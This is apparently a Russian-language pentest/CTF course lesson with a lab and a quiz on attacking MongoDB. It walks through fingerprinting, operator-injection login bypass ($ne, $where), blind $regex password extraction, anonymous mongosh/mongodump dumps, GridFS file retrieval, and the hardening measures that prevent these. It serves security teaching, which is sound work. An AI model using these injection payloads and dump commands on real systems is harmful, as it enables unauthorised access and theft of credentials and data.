---
id: db-mongodb
title: "MongoDB: операторная инъекция, JS и дамп базы"
category: web
parent: web-nosql-dbms
difficulty: hard
order: 1
tags: [nosql, mongodb, injection, where, regex, mapreduce, mongosh, gridfs]
prerequisites: [web-nosql-injection, web-nosql-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 50
summary: "MongoDB от фингерпринта до RCE: анонимный доступ на 27017, операторная инъекция ($ne/$gt/$regex/$where), blind-извлечение, JS-выполнение и дамп через mongosh."
lab:
  kind: shell
  title: 'Практика: MongoDB — операторная инъекция и дамп'
  toolset: [core, curl, mongosh]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Обойди логин: отправь пароль объектом-оператором `{"$ne":"x"}`.'
    - 'Фингерпринт Mongo — `ObjectId` в ответах `/api/items`.'
    - 'Если порт открыт без auth — база читается клиентом: `mongosh "mongodb://shop.local:27017" --eval ''db.getMongo().getDBNames()''`.'
    - 'Дамп: `db.users.find({},{username:1,password:1}).toArray()`.'
---

## Задача

Мы уже знаем, что `shop.local` ходит в MongoDB. Теперь хотим выжать максимум: войти администратором, вытащить пароли других пользователей, а если повезёт — прочитать всю базу напрямую и проверить, не выполняется ли на сервере JavaScript (это путь к RCE). Разберём MongoDB по шагам на одном объекте.

## Данные, с которыми работаем

Точка входа — тот же логин:

```http
POST /api/login HTTP/1.1
Host: shop.local
Content-Type: application/json

{"username":"admin","password":"test"}
```

Сервер отвечает `{"error":"invalid credentials"}`. Заодно `nmap` показывает открытый порт:

```bash
$ nmap -sV -p 27017,28017 shop.local
27017/tcp open  mongodb  MongoDB 4.4.6
28017/tcp open  http     MongoDB HTTP interface
```

Версия важна: от неё зависит, доступен ли `db.eval` (до 4.2). Здесь 4.4.6 — значит, старый RCE через `db.eval` уже не сработает, но `$where` остаётся.

## Шаг 1: фингерпринт — как понять, что бэкенд именно Mongo

Помимо `nmap`, MongoDB выдаёт себя в ответах приложения. Ищем `ObjectId` — это уникальный идентификатор документа, 24 hex-символа:

```bash
$ curl -s https://shop.local/api/items | grep -oE '"_id":"[a-f0-9]{24}"'
"_id":"6512f3a9c2b4e5d6f7a8b9c0"
```

Такие строки — почти безошибочный признак MongoDB. Ещё подсказки: ошибки `MongoError`, `E11000 duplicate key`, `CastError`, а по HTTP-порту 28017 — характерная строка «It looks like you are trying to access MongoDB over HTTP on the native driver port».

## Шаг 2: операторная инъекция — обходим вход

Вспомним ядро: `findOne({username, password})` вставляет наше значение как есть. Пришлём пароль **объектом** с оператором:

```bash
$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
>   -d '{"username":"admin","password":{"$ne":"x"}}'
{"token":"eyJhbGciOiJIUzI1NiJ9...","user":{"role":"admin"}}
```

`$ne` — «не равно»: условие истинно для настоящего пароля, вход проходит. Другие операторы:

| Оператор | Смысл | Значение |
|----------|-------|----------|
| `$ne` | не равно | `{"$ne":"x"}` |
| `$gt` / `$gte` | больше | `{"$gt":""}` |
| `$in` | входит в список | `{"$in":["admin","root"]}` |
| `$exists` | поле существует | `{"$exists":true}` |
| `$regex` | регулярка | `{"$regex":"^a"}` |

## Шаг 3: доставка в JSON, форме и URL

Синтаксис payload зависит от формата тела.

**JSON** — вложенный объект, как выше.

**form-urlencoded** — скобочная нотация; парсер `qs` в Express разворачивает её в объект:

```bash
$ curl -s -X POST https://shop.local/api/login -d 'user=admin&pass[$ne]=x'
# на сервере станет {user:"admin", pass:{$ne:"x"}}
```

**Query-строка** — то же, но скобки кодируются:

```bash
$ curl -s 'https://shop.local/api/user?name=admin&token%5B%24ne%5D=x'
```

Если WAF фильтрует `$`, помогает `%24` вместо `$` или вложенный `$regex`.

## Шаг 4: слепое извлечение через `$regex`

Ответа с данными может не быть — тогда спрашиваем «верно/неверно». Проверим, начинается ли пароль `root` на `a`:

```bash
$ curl -s -o /dev/null -w '%{http_code}\n' -X POST https://shop.local/api/login \
>   -H 'Content-Type: application/json' \
>   -d '{"username":"root","password":{"$regex":"^a"}}'
200
```

`200` — префикс верный. Перебирая символы и дописывая их к префиксу, восстанавливаем пароль целиком. Это аналог boolean-blind из SQLi. Тем же способом тянут любые поля: `{"resetToken":{"$regex":"^sec"}}`.

## Шаг 5: `$where` — JavaScript на сервере

Оператор `$where` принимает **строку с JavaScript**, которая вычисляется для каждого документа. Это одновременно и инъекция, и потенциальный RCE:

```bash
$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
>   -d '{"username":"admin","password":{"$where":"1==1"}}'
{"token":"eyJ..."}
```

`1==1` — всегда истина, вход пройден. На старых версиях (< 4.2) есть и `db.eval`, и `sleep()` для time-blind. Проверить движок можно так:

```javascript
db.serverStatus().javascriptEngine   // "mozjs" (старый) / "none"
```

На современных версиях RCE через JS нет — переходим к дампу.

## Шаг 6: дамп — напрямую и через GridFS

Если порт 27017 открыт без `--auth`, база читается клиентом целиком:

```bash
$ mongosh "mongodb://shop.local:27017" --eval 'db.getMongo().getDBNames()'
[ 'admin', 'shop', 'users' ]

$ mongosh "mongodb://shop.local:27017/shop" --eval 'db.users.find({},{username:1,password:1}).toArray()'
[
  { _id: ObjectId("6512f3a9..."), username: 'admin', password: '$2b$10$...' },
  { _id: ObjectId("6512f3aa..."), username: 'root',  password: '$2b$10$...' }
]
```

Хеши паролей — это уже доказательство. Быстро выгрузить всё:

```bash
$ mongodump --host shop.local --out ./dump && grep -ri 'password' ./dump | head
```

Отдельная жила — **GridFS**, файловое хранилище Mongo (коллекции `fs.files` и `fs.chunks`). Там лежат загруженные файлы, иногда бэкапы и секреты:

```bash
$ mongofiles -h shop.local --db shop list
backup.zip
$ mongofiles -h shop.local --db shop get 'backup.zip'
```

## Шаг 7: RCE на старых версиях и проверка прав

До MongoDB 4.2 `db.eval()` и `mapReduce` исполняли JavaScript на сервере, и через хитрый `this`/`Function` можно было дотянуться до системных вызовов. Проверим, есть ли JS-движок вообще:

```bash
$ mongosh "mongodb://shop.local:27017" --eval 'db.serverStatus().javascriptEngine'
mozjs
```

`mozjs` — движок включён; на 4.4 он уже не даёт `db.eval`, но сам факт стоит зафиксировать. Дальше смотрим, кем мы подключились и какие права есть:

```bash
$ mongosh "mongodb://shop.local:27017" --eval 'db.runCommand({connectionStatus:1}).authInfo'
{ authenticatedUsers: [], authenticatedUserRoles: [] }

$ mongosh "mongodb://shop.local:27017" --eval 'db.getUsers()'
[
  { _id: 'admin.root', user: 'root', roles: [ { role: 'root', db: 'admin' } ] }
]
```

Пустой `authenticatedUsers` — мы анонимны, аутентификация не включена. `db.getUsers()` показывает учётки и их роли: `root` в `admin` — это полный контроль над сервером. С этой позиции можно и дампить, и (на уязвимых версиях) идти к RCE.

## Почему Mongo ломается иначе: типы вместо строк

Классическая SQL-инъекция работает на уровне синтаксиса: пользовательская строка склеивается с SQL-запросом, и кавычка позволяет переписать логику. MongoDB устроена иначе — запросы здесь передаются не текстом, а структурированными объектами (BSON). Казалось бы, это защищает от инъекции. Но защита рушится там, где граница между «данными» и «кодом» размывается на уровне **типов**.

Рассмотрим запрос `findOne({username: user, password: pass})`. В BSON-выражении поле `password` может быть не только строкой, но и **оператором** — объектом вроде `{$ne: "x"}`. Приложение получает значение из JSON и передаёт его в запрос как есть. Если оно не проверило, что это строка, база честно исполнит оператор. Это и есть операторная инъекция: не переписывание синтаксиса, а подмена типа.

Отсюда следуют все каналы доставки. JSON позволяет вложить объект напрямую: `{"password":{"$ne":"x"}}`. Форма в стиле Express использует скобочную нотацию `pass[$ne]=x`, которую парсер `qs` разворачивает в тот же объект. Query-строка делает то же самое с URL-кодированием. Везде суть одна — доставить не строку, а структуру.

Второе отличие — JavaScript. MongoDB умеет вычислять предикаты, написанные на JS, через `$where`. Это снова размывает границу: вместо значения передаётся код, который сервер исполняет для каждого документа. На старых версиях (`db.eval`, `mapReduce`) это превращалось в полноценный RCE. Даже когда RCE убрали, `$where` остался как вектор инъекции и как способ замедлить сервер (тяжёлый предикат на большой коллекции).

Третье — модель аутентификации. MongoDB исторически запускалась без `--auth` и с bind на все интерфейсы. Если порт 27017 открыт и авторизация выключена, инъекция вообще не нужна: ты читаешь базу напрямую. Поэтому в дереве фингерпринт и проверка порта идут раньше всех payload'ов — иногда весь «взлом» сводится к `mongosh`.

Итог: в MongoDB побеждает не строка, а объект с оператором. Защита — строгая проверка типов входных данных (`typeof`), отключение серверного JS и обязательный `--auth`.

Наконец, помни про версию как про отдельный факт находки. «Открытый MongoDB» и «MongoDB 4.4 с открытым портом» — это разные уровни риска: на старой версии к этому добавляется исполнение JS и исторические RCE, на новой остаётся только доступ к данным. Записывай версию вместе с портом и статусом аутентификации — от неё зависит и выбор вектора, и оценка серьёзности в отчёте.

## Что мы теперь знаем

- MongoDB выдаёт себя `ObjectId` (24 hex) и ошибками `MongoError`/`CastError`; версию даёт `nmap -sV`.
- Операторная инъекция: объект `{"$ne":"x"}` вместо строки обходит логин.
- Доставка — JSON, form (`pass[$ne]=x`), query (`%5B%24ne%5D`).
- `$regex` с `^prefix` — оракул для посимвольного извлечения.
- `$where` исполняет JS; `db.eval`/`sleep` — только на версиях < 4.2.
- Открытый 27017 читается напрямую (`mongosh`/`mongodump`); GridFS прячет файлы.

## На что смотреть дальше

- **Не подставляй `_id` как число.** Это `ObjectId`, не строка и не int — при инъекции используй строку или hex.
- **Дамп с лимитом.** `find()` на большой коллекции повесит сессию; сначала `countDocuments()`, потом `limit`/`skip`.
- **`$where` тяжело грузит базу.** Тайминг-payload может уронить сервер — на боевом осторожно.
- **Разрушительное — только с согласия.** `db.dropDatabase()`, `deleteMany` не выполняй без явного разрешения; `mongodump` безопасен (только чтение).
- **Blind ускоряют бинарным поиском.** Вместо перебора символов проверяй диапазоны (`^[a-m]`) — половина алфавита отбрасывается за один запрос.

## Квиз

Проверь себя.

```quiz
- question: "Какое значение поля password в JSON обходит проверку логина в MongoDB?"
  options:
    - "`' OR 1=1 -- -`"
    - '`{"$ne":"x"}`'
    - "`UNION SELECT NULL`"
    - "`' OR '1'='1`"
  answer: 1
  explanation: "Оператор `$ne` (не равно) делает условие истинным для любого настоящего пароля."
- question: "Как записать операторную инъекцию в application/x-www-form-urlencoded?"
  options:
    - "`pass=$ne:x`"
    - "`pass[$ne]=x`"
    - '`pass={"$ne":"x"}`'
    - "`pass%3Dne`"
  answer: 1
  explanation: "Скобочная нотация разворачивается парсером `qs` в объект."
- question: "Каким оператором MongoDB делают blind-извлечение посимвольно?"
  options:
    - "`LIKE`"
    - "`$regex`"
    - "`SUBSTRING`"
    - "`MATCH`"
  answer: 1
  explanation: "`$regex` с якорем `^` проверяет префикс и даёт boolean-сигнал."
- question: "Что выполняет JavaScript на сервере MongoDB в старых версиях?"
  options:
    - "`UNION`"
    - "`$where` и `db.eval`"
    - "`CONFIG SET`"
    - "`Cypher`"
  answer: 1
  explanation: "`$where` вычисляет JS-предикат; `db.eval` (до 4.2) исполнял произвольный JS."
- question: "Какая утилита выгружает всю базу MongoDB снаружи?"
  options:
    - "`redis-cli`"
    - "`mongodump`"
    - "`pg_dump`"
    - "`cqlsh`"
  answer: 1
  explanation: "`mongodump` подключается по wire-протоколу и сохраняет коллекции в BSON."
```

## Куда дальше

Мы разобрали MongoDB от фингерпринта до дампа и проверки JS-движка. В следующем уроке `db-redis` — там другой протокол, но ещё более прямой путь к RCE: открытый Redis умеет **записывать файлы на диск** (webshell, SSH-ключи, cron). А пока главное запомни: в MongoDB побеждает не строка, а объект с оператором.

## Где пригодится

- **CTF (Web):** MongoDB-логины и открытый 27017 — частые задачи; `$ne` и `$regex` решают большинство.
- **Bug bounty:** обход аутентификации через тип-конфузию и открытая база — critical-находки.
- **Пентест:** быстрый фингерпринт и дамп через `mongosh`/`mongodump` — стандартная рутина.
- **Работа (AppSec):** типизация входа, `--auth` + bind на localhost, отключение серверного JS — базовый hardening.
